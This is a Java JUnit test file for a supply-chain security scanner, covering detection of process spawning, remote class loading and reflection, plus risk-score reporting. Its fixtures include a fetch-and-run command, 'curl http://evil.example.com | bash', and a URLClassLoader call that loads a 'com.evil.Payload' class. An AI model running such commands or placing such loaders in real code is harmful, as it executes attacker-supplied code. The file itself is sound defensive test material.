package com.dede.cloud;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * SC-004: Tests for supply-chain security detection.
 *
 * Verifies:
 * - SC-001: Class-scoped method matching in ForbiddenApiCatalog
 * - SC-002: Caller-type-aware detection in ForbiddenApiScanner
 * - SC-003: SupplyChainReport scoring and Markdown output
 */
class SupplyChainDetectionTest {

    private ForbiddenApiCatalog catalog;
    private ForbiddenApiScanner scanner;

    @BeforeEach
    void setUp() {
        // ForbiddenApiCatalog uses @PostConstruct via Spring, call init() directly in tests
        catalog = new ForbiddenApiCatalog();
        catalog.init();
        // GraphService not needed for scanJavaFile tests — pass null (violations only)
        scanner = new ForbiddenApiScanner(null, catalog);
    }

    // -----------------------------------------------------------------------
    // SC-001: Catalog class-scoped method matching
    // -----------------------------------------------------------------------
    @Nested
    class CatalogClassScopedMethodTests {

        @Test
        void execOnRuntimeIsFlagged() {
            var match = catalog.checkClassScopedMethod("Runtime", "exec");
            assertThat(match).isPresent();
            assertThat(match.get().categoryName()).isEqualTo("SUPPLY_CHAIN_PROCESS_SPAWN");
            assertThat(match.get().severity()).isEqualTo(ForbiddenApiCatalog.Severity.CRITICAL);
        }

        @Test
        void execOnProcessBuilderIsFlagged() {
            var match = catalog.checkClassScopedMethod("ProcessBuilder", "start");
            assertThat(match).isPresent();
            assertThat(match.get().categoryName()).isEqualTo("SUPPLY_CHAIN_PROCESS_SPAWN");
        }

        @Test
        void execOnUnrelatedClassIsNotFlagged() {
            // "exec" on e.g. a query object must NOT trigger supply-chain rule
            var match = catalog.checkClassScopedMethod("QueryBuilder", "exec");
            assertThat(match).isEmpty();
        }

        @Test
        void loadClassOnUrlClassLoaderIsFlagged() {
            var match = catalog.checkClassScopedMethod("URLClassLoader", "loadClass");
            assertThat(match).isPresent();
            assertThat(match.get().categoryName()).isEqualTo("SUPPLY_CHAIN_REMOTE_CLASSLOAD");
        }

        @Test
        void forNameWithNoClassScopeIsFlagged() {
            // Class.forName() has empty classes list — any-scope match
            var match = catalog.checkMethod("forName");
            assertThat(match).isPresent();
            assertThat(match.get().categoryName()).isEqualTo("SUPPLY_CHAIN_REFLECTION_LOAD");
        }

        @Test
        void matchTypeIsClassScopedMethodForScopedRules() {
            var match = catalog.checkClassScopedMethod("Runtime", "exec");
            assertThat(match).isPresent();
            assertThat(match.get().matchType()).isEqualTo(ForbiddenApiCatalog.MatchType.CLASS_SCOPED_METHOD);
        }
    }

    // -----------------------------------------------------------------------
    // SC-002: Scanner caller-type detection
    // -----------------------------------------------------------------------
    @Nested
    class ScannerCallerTypeTests {

        @TempDir
        Path tempDir;

        @Test
        void detectsRuntimeExecByScope() throws IOException {
            Path javaFile = tempDir.resolve("EvilBundle.java");
            Files.writeString(javaFile, """
                package com.example;
                public class EvilBundle {
                    public void activate() throws Exception {
                        Runtime rt = Runtime.getRuntime();
                        rt.exec("curl http://evil.example.com | bash");
                    }
                }
                """);

            List<ForbiddenApiScanner.ForbiddenApiViolation> violations = scanner.scanJavaFile(javaFile);
            assertThat(violations)
                .extracting(ForbiddenApiScanner.ForbiddenApiViolation::category)
                .contains("SUPPLY_CHAIN_PROCESS_SPAWN");
        }

        @Test
        void doesNotFlagExecOnUnrelatedObject() throws IOException {
            Path javaFile = tempDir.resolve("SafeBundle.java");
            Files.writeString(javaFile, """
                package com.example;
                import com.day.cq.search.Query;
                public class SafeBundle {
                    public void search(Query query) {
                        query.exec();
                    }
                }
                """);

            List<ForbiddenApiScanner.ForbiddenApiViolation> violations = scanner.scanJavaFile(javaFile);
            long spawnViolations = violations.stream()
                .filter(v -> "SUPPLY_CHAIN_PROCESS_SPAWN".equals(v.category()))
                .count();
            assertThat(spawnViolations).isZero();
        }

        @Test
        void detectsUrlClassLoaderLoadClass() throws IOException {
            Path javaFile = tempDir.resolve("Loader.java");
            Files.writeString(javaFile, """
                package com.example;
                import java.net.URLClassLoader;
                import java.net.URL;
                public class Loader {
                    public void loadRemote(URL url) throws Exception {
                        URLClassLoader cl = new URLClassLoader(new URL[]{url});
                        cl.loadClass("com.evil.Payload");
                    }
                }
                """);

            List<ForbiddenApiScanner.ForbiddenApiViolation> violations = scanner.scanJavaFile(javaFile);
            assertThat(violations)
                .extracting(ForbiddenApiScanner.ForbiddenApiViolation::category)
                .contains("SUPPLY_CHAIN_REMOTE_CLASSLOAD");
        }

        @Test
        void detectsClassForName() throws IOException {
            Path javaFile = tempDir.resolve("Reflective.java");
            Files.writeString(javaFile, """
                package com.example;
                public class Reflective {
                    public void load(String className) throws Exception {
                        Class<?> clazz = Class.forName(className);
                        clazz.getDeclaredMethod("run").invoke(null);
                    }
                }
                """);

            List<ForbiddenApiScanner.ForbiddenApiViolation> violations = scanner.scanJavaFile(javaFile);
            assertThat(violations)
                .extracting(ForbiddenApiScanner.ForbiddenApiViolation::category)
                .contains("SUPPLY_CHAIN_REFLECTION_LOAD");
        }
    }

    // -----------------------------------------------------------------------
    // SC-003: SupplyChainReport scoring and output
    // -----------------------------------------------------------------------
    @Nested
    class SupplyChainReportTests {

        @TempDir
        Path projectRoot;

        private List<ForbiddenApiScanner.ForbiddenApiViolation> makeViolations(int critical, int high) {
            var violations = new java.util.ArrayList<ForbiddenApiScanner.ForbiddenApiViolation>();
            for (int i = 0; i < critical; i++) {
                violations.add(new ForbiddenApiScanner.ForbiddenApiViolation(
                    projectRoot.resolve("Foo.java").toString(), i + 1,
                    ForbiddenApiScanner.ViolationType.FORBIDDEN_METHOD_CALL,
                    "exec", "SUPPLY_CHAIN_PROCESS_SPAWN",
                    ForbiddenApiCatalog.Severity.CRITICAL,
                    "OS process spawning detected", "Use Sling Jobs"
                ));
            }
            for (int i = 0; i < high; i++) {
                violations.add(new ForbiddenApiScanner.ForbiddenApiViolation(
                    projectRoot.resolve("Bar.java").toString(), i + 1,
                    ForbiddenApiScanner.ViolationType.FORBIDDEN_METHOD_CALL,
                    "forName", "SUPPLY_CHAIN_REFLECTION_LOAD",
                    ForbiddenApiCatalog.Severity.HIGH,
                    "Reflective class loading detected", "Use @Reference"
                ));
            }
            return violations;
        }

        @Test
        void emptyViolationsProducesZeroRiskScore() {
            SupplyChainReport report = new SupplyChainReport(List.of(), projectRoot);
            assertThat(report.getRiskScore()).isZero();
            assertThat(report.isCritical()).isFalse();
        }

        @Test
        void singleCriticalViolationScores30() {
            SupplyChainReport report = new SupplyChainReport(makeViolations(1, 0), projectRoot);
            assertThat(report.getRiskScore()).isEqualTo(30);
            assertThat(report.isCritical()).isTrue();
        }

        @Test
        void riskScoreIsCappedAt100() {
            SupplyChainReport report = new SupplyChainReport(makeViolations(5, 5), projectRoot);
            assertThat(report.getRiskScore()).isLessThanOrEqualTo(100);
        }

        @Test
        void cleanProjectMarkdownContainsCheckmark() {
            SupplyChainReport report = new SupplyChainReport(List.of(), projectRoot);
            assertThat(report.toMarkdown()).contains("✅");
        }

        @Test
        void violatingProjectMarkdownContainsRiskScore() {
            SupplyChainReport report = new SupplyChainReport(makeViolations(1, 0), projectRoot);
            String md = report.toMarkdown();
            assertThat(md).contains("Risk Score");
            assertThat(md).contains("CRITICAL");
            assertThat(md).contains("SUPPLY_CHAIN_PROCESS_SPAWN");
        }

        @Test
        void toSummaryContainsExpectedKeys() {
            SupplyChainReport report = new SupplyChainReport(makeViolations(1, 1), projectRoot);
            Map<String, Object> summary = report.toSummary();
            assertThat(summary).containsKeys("riskScore", "critical", "totalFindings", "categories", "findings");
            assertThat(summary.get("totalFindings")).isEqualTo(2);
        }

        @Test
        void nonSupplyChainViolationsAreFiltered() {
            // A non-supply-chain violation should be filtered out of the report
            var mixed = new java.util.ArrayList<ForbiddenApiScanner.ForbiddenApiViolation>();
            mixed.addAll(makeViolations(1, 0));
            mixed.add(new ForbiddenApiScanner.ForbiddenApiViolation(
                projectRoot.resolve("Other.java").toString(), 5,
                ForbiddenApiScanner.ViolationType.FORBIDDEN_IMPORT,
                "com.day.cq.replication.ReplicationAction", "DEPRECATED_REPLICATION_API",
                ForbiddenApiCatalog.Severity.HIGH,
                "Use Sling Jobs", null
            ));
            SupplyChainReport report = new SupplyChainReport(mixed, projectRoot);
            assertThat(report.getViolations()).hasSize(1);
        }
    }
}
